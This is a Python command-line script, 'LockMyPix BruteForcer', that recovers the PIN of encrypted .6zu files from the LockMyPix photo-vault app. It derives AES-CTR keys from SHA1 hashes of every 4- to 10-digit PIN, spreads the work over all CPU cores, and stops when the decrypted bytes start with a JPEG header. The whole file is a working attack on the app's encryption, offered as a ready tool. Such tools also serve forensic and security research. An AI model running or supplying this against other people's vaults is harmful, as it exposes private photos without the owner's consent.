import argparse
import logging
import hashlib
from Crypto.Cipher import AES
from Crypto.Util import Counter
import binascii
import multiprocessing

logging.basicConfig(
    level=logging.INFO,
    format='[%(levelname)s] %(asctime)s %(message)s',
    datefmt='%d-%m-%Y %H:%M:%S',
)

MAGIC_HEADER = "ffd8ff"  # JPEG magic header

def generate_pins(start, end, length):
    return [f"{i:0{length}}" for i in range(start, end)]

def decrypt_and_check(pin, data):
    key = hashlib.sha1(pin.encode()).digest()[:16]
    iv = key
    counter = Counter.new(128, initial_value=int.from_bytes(iv, "big"))
    cipher = AES.new(key, AES.MODE_CTR, counter=counter)
    dec_data = cipher.decrypt(data)
    header = binascii.hexlify(dec_data).decode("utf8")
    if header.startswith(MAGIC_HEADER):
        return pin
    return None

def worker(pin_range, data, length):
    for pin in generate_pins(*pin_range, length):
        result = decrypt_and_check(pin, data)
        if result:
            return result
    return None

def bruteforce(input_path, max_digits=10):
    if not input_path.endswith(".6zu"):
        logging.warning("Script requires a .6zu file")
        raise SystemExit(1)

    with open(input_path, "rb") as f:
        enc_data = f.read(16)

    cpu_count = multiprocessing.cpu_count()
    logging.info(f"Using {cpu_count} cores")

    for length in range(4, max_digits + 1):
        max_val = 10 ** length
        chunk_size = max_val // cpu_count
        logging.info(f"Trying {length}-digit PINs...")

        with multiprocessing.Pool(cpu_count) as pool:
            tasks = [((i, min(i + chunk_size, max_val)), enc_data, length) for i in range(0, max_val, chunk_size)]
            results = pool.starmap(worker, tasks)
            for pin in results:
                if pin:
                    logging.info(f"PIN found: {pin}")
                    return pin

    logging.info("Could not find PIN, possibly not 4–10 digits or not AES-encrypted JPEG")
    return None

def main():
    parser = argparse.ArgumentParser("LockMyPix BruteForcer")
    parser.add_argument("input", help="Path to .6zu file")
    parser.add_argument("--max", type=int, default=10, help="Maximum PIN digit length to test (default: 10)")
    args = parser.parse_args()

    bruteforce(args.input, args.max)

if __name__ == "__main__":
    main()
